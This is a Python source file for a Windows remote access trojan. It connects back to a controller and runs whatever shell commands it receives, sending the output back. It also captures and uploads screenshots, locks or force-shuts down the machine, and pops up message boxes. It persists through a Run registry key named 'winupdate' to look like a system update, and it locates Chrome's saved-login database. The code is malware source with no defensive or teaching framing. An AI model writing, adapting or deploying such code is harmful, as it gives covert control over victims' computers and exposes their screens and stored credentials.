import threading
import socket
import os
import sys
import time
import subprocess
import re
import sqlite3
import ctypes
import pyscreeze

import shutil
from winreg import *

port = 0


def startup():
	r_path = os.path.realpath(sys.argv[0])
	appdata_path = os.environ["APPDATA"]
	app_path = appdata_path + '\\' + os.path.basename(r_path)
	try:
		shutil.copyfile(r_path, app_path)
		obj_reg_key = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
		SetValueEx(obj_reg_key, "winupdate", 0, REG_SZ, app_path)
		CloseKey(obj_reg_key)
	except WindowsError as e:
		return f'WindowsError: {e}'
	else:
		return 'sucessful!'


def remove_startup():
	try:
		obj_reg_key = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
		DeleteValue(obj_reg_key, "winupdate")
		CloseKey(obj_reg_key)
	except FileNotFoundError as e:
		return f'FileNotFoundError: {e}'
	except WindowsError as e:
		return f'WindowsError: {e}'
	else:
		return 'sucessful!'


def chrome_data():
	path = os.path.join(os.environ['APPDATA'] + '/../Local/Google/Chrome/User Data/Default/Login Data')
	if not os.path.isfile(path):
		return 'not found'
	return path


def try_connect(hostname, port):
	sockf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print(f'try connect {hostname}:{port}')
	sockf.connect((hostname, port))
	return sockf


def shutdown(sockt):
	command = 'shutdown -s -f -t 30'
	subprocess.Popen(command.split(), shell=True)
	sockt.close()
	sys.exit(0)


while True:
	try:
		sock = try_connect('0.0.0.0', port)
		while True:
			recv_mesg = sock.recv(1024).decode("utf-8", errors="ignore")
			if '__exit' in recv_mesg:
				sock.sendall(b'__close.')
				break
			if '__taskkill' in recv_mesg:
				sock.close()
				sys.exit(0)
			elif '__lock' in recv_mesg:
				ctypes.windll.user32.LockWorkStation()
			elif '__startup' in recv_mesg:
				sock.sendall(startup().encode())
				print(recv_mesg)
				break
			elif '__clear' in recv_mesg:
				sock.sendall(remove_startup().encode())
				print(recv_mesg)
				break
			elif '__screenshot' in recv_mesg:
				name_pr = str(time.time()) + '.png'
				pyscreeze.screenshot(name_pr)
				time.sleep(1)
				if os.path.isfile(name_pr):
					sock.sendall(f'ok:{name_pr}'.encode())
					screen_file = open(name_pr, 'rb')
					sock.sendall(screen_file.read())
					screen_file.close()
				else:
					sock.sendall('no:no'.encode())
			elif '__message_box' in recv_mesg:
				vbs = open('temp.vbs', 'w')
				vbs.write(
					"Msgbox \"" + recv_mesg.split(':')[1] + "\", vbOKOnly+vbInformation+vbSystemModal, \"Message\"")
				vbs.close()
				subprocess.Popen(["temp.vbs"], shell=True)
			else:
				obj_command = subprocess.Popen(recv_mesg, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
					stdin=subprocess.PIPE, shell=True)
				if re.search(f'^cd', recv_mesg, re.I):
					output = recv_mesg
				else:
					output = (obj_command.stdout.read() + obj_command.stderr.read()).decode("utf-8", errors="ignore")

			print(recv_mesg)
			sock.sendall(f'{output}'.encode())
		print('closing socket')
		sock.close()
		wait = threading.Thread(target=lambda: time.sleep(10))
		wait.start()
		wait.join()
	except TimeoutError:
		time.sleep(20)
	except:
		time.sleep(20)
